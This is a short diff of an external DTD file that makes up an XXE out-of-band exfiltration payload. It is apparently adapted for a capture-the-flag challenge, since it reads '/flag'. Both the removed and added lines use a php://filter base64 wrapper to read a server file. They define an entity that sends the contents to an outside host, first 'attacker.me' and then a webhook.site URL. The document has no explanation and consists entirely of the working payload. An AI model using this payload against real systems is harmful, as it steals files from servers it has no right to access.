@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/Users/yasho/Desktop/test.php">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://attacker.me:9091/?d=%data;'>">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'https://webhook.site/fd946b62-c8f0-4053-8db2-a623de9ea02c/?d=%data;'>">
